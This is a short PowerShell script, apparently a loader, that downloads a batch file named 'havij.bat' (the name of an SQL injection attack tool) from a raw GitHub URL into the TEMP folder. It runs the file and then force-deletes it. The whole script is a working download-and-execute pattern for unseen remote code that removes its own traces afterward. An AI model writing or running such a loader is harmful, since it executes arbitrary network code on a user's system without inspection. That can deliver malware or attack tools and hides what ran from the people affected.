# Enable TLS 1.2 support
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor [System.Net.SecurityProtocolType]::Tls12

# Set download URL and destination path
$DownloadURL = 'https://raw.githubusercontent.com/mdromanmoonshi/havij/main/havij.bat'
$FilePath = "$env:TEMP\havij.bat"

# Attempt to download the file
try {
    Invoke-WebRequest -Uri $DownloadURL -OutFile $FilePath
} catch {
    Write-Error "Error downloading the file: $_"
    return
}

# If the file exists, run it and then delete it
if (Test-Path $FilePath) {
    Start-Process $FilePath -Wait
    Remove-Item $FilePath -Force
}
